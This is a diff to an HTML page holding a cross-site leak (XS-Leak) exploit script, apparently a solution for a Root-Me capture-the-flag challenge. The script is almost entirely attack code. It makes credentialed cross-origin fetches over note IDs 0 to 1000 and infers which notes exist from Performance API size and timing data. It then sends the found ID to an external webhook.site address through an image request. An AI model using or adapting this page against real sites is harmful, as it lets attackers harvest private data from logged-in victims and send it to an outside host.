@@ -1,94 +1,128 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XS-Leak Note Finder</title>
+    <title>XS-Leak Note Finder (Improved)</title>
 </head>
 <body>
-    <h1>Checking notes...</h1>
+    <h1>Scanning for notes...</h1>
     <div id="status"></div>
     <script>
         const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
-        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';   // <-- CHANGE THIS
+        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
         const START_ID = 0;
         const END_ID = 1000;
-        const DELAY_MS = 200;           // delay between requests
-        const SIZE_THRESHOLD = 200;      // bytes; 404 responses are ~45-100 bytes
+        const DELAY_MS = 200;          // delay between requests
+        const SAMPLES_PER_ID = 3;       // number of times to measure each ID (to reduce noise)
+        const BASELINE_ID = -1;          // a non‑existent ID to measure error response
 
         let currentId = START_ID;
 
         function updateStatus(msg) {
-            document.getElementById('status').innerHTML += msg + '<br>';
+            const div = document.getElementById('status');
+            div.innerHTML += msg + '<br>';
             console.log(msg);
+        }
+
+        // Measure a single request and return its size (or duration as fallback)
+        function measureOnce(url) {
+            return new Promise((resolve) => {
+                // Use fetch with no-cors to ensure the request is sent and recorded
+                const start = performance.now();
+                fetch(url, { mode: 'no-cors', credentials: 'include' }).then(() => {
+                    // Wait for the performance entry to be written
+                    setTimeout(() => {
+                        const entries = performance.getEntriesByName(url);
+                        let size = 0;
+                        let duration = 0;
+                        if (entries.length > 0) {
+                            // Try to get the actual transferred size (most reliable)
+                            size = entries[0].transferSize || entries[0].encodedBodySize || 0;
+                            duration = entries[0].duration;
+                        }
+                        // If we have no size, fall back to duration (less reliable)
+                        if (size === 0 && duration > 0) {
+                            resolve({ size: 0, duration: duration });
+                        } else {
+                            resolve({ size: size, duration: duration });
+                        }
+                        // Clean up the performance entry to avoid memory growth
+                        performance.clearResourceTimings();
+                    }, 100);
+                }).catch(() => {
+                    // Network error – treat as failure
+                    resolve({ size: 0, duration: 0 });
+                });
+            });
+        }
+
+        // Measure an ID multiple times and return the average size and duration
+        async function measureAverage(id, samples = SAMPLES_PER_ID) {
+            let totalSize = 0;
+            let totalDuration = 0;
+            let validSamples = 0;
+            const url = TARGET_BASE + id;
+            for (let i = 0; i < samples; i++) {
+                const { size, duration } = await measureOnce(url);
+                if (size > 0 || duration > 0) {
+                    totalSize += size;
+                    totalDuration += duration;
+                    validSamples++;
+                }
+                // Small delay between repeated measurements of same ID
+                await new Promise(r => setTimeout(r, 100));
+            }
+            if (validSamples === 0) return { avgSize: 0, avgDuration: 0 };
+            return {
+                avgSize: totalSize / validSamples,
+                avgDuration: totalDuration / validSamples
+            };
+        }
+
+        // Measure baseline (non‑existent ID) to get typical error size/duration
+        async function getBaseline() {
+            updateStatus(`Measuring baseline using ID ${BASELINE_ID}...`);
+            const { avgSize, avgDuration } = await measureAverage(BASELINE_ID, SAMPLES_PER_ID);
+            updateStatus(`Baseline: size = ${avgSize.toFixed(1)} bytes, duration = ${avgDuration.toFixed(1)} ms`);
+            return { baselineSize: avgSize, baselineDuration: avgDuration };
+        }
+
+        // Decide if a response indicates a real note
+        function isPositive(measure, baseline) {
+            const sizeDiff = measure.avgSize - baseline.baselineSize;
+            const durationDiff = measure.avgDuration - baseline.baselineDuration;
+            // If we have size data, trust it more
+            if (baseline.baselineSize > 0 && measure.avgSize > 0) {
+                // Real notes are likely significantly larger than error pages
+                const sizeThreshold = baseline.baselineSize * 1.5; // at least 50% larger
+                return measure.avgSize > sizeThreshold;
+            } else {
+                // Fallback to duration – require at least 2x the baseline duration
+                return durationDiff > baseline.baselineDuration;
+            }
+        }
+
+        async function checkId(id, baseline) {
+            const measure = await measureAverage(id);
+            updateStatus(`ID ${id}: size = ${measure.avgSize.toFixed(1)} bytes, duration = ${measure.avgDuration.toFixed(1)} ms`);
+            return isPositive(measure, baseline);
         }
 
         function reportId(id) {
             const url = `${WEBHOOK}?id=${id}`;
-            new Image().src = url;   // send report
-            updateStatus(`✅ Found note ID: ${id} → reported to webhook`);
-        }
-
-        function checkId(id) {
-            return new Promise((resolve) => {
-                const url = TARGET_BASE + id;
-                const link = document.createElement('link');
-                link.rel = 'preload';
-                link.as = 'fetch';
-                link.href = url;
-
-                // Clean up after load/error
-                const cleanup = () => {
-                    if (link.parentNode) link.parentNode.removeChild(link);
-                };
-
-                link.onload = () => {
-                    // Wait a moment for the performance entry to be written
-                    setTimeout(() => {
-                        const entries = performance.getEntriesByName(url);
-                        let size = 0;
-                        if (entries.length > 0) {
-                            // transferSize is the most accurate, but may be 0 for cross-origin
-                            // If so, fallback to encodedBodySize or duration
-                            size = entries[0].transferSize || entries[0].encodedBodySize || 0;
-                            // If we still have 0, use duration as a proxy (less reliable)
-                            if (size === 0 && entries[0].duration) {
-                                // Use duration: larger duration = larger response
-                                // This is a fallback; you may adjust threshold accordingly
-                                const duration = entries[0].duration;
-                                if (duration > 50) { // typical 404 might be faster
-                                    updateStatus(`ID ${id}: duration ${duration.toFixed(2)}ms (fallback)`);
-                                    resolve(true);
-                                    cleanup();
-                                    return;
-                                }
-                            }
-                        }
-                        updateStatus(`ID ${id}: size = ${size} bytes`);
-                        resolve(size > SIZE_THRESHOLD);
-                        cleanup();
-                    }, 50);
-                };
-
-                link.onerror = () => {
-                    // Network error or resource blocked
-                    updateStatus(`ID ${id}: error loading (probably network/CORS)`);
-                    resolve(false);
-                    cleanup();
-                };
-
-                document.head.appendChild(link);
-            });
+            new Image().src = url;
+            updateStatus(`✅ Found note ID: ${id} → reported`);
         }
 
         async function run() {
+            const baseline = await getBaseline();
             updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
             for (let id = START_ID; id <= END_ID; id++) {
-                const exists = await checkId(id);
+                const exists = await checkId(id, baseline);
                 if (exists) {
                     reportId(id);
-                    // Optionally stop after first found? Remove this line to continue scanning.
+                    // Remove the following line if you want to continue scanning
                     break;
                 }
-                // Wait before next request
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
             updateStatus('Scan complete.');
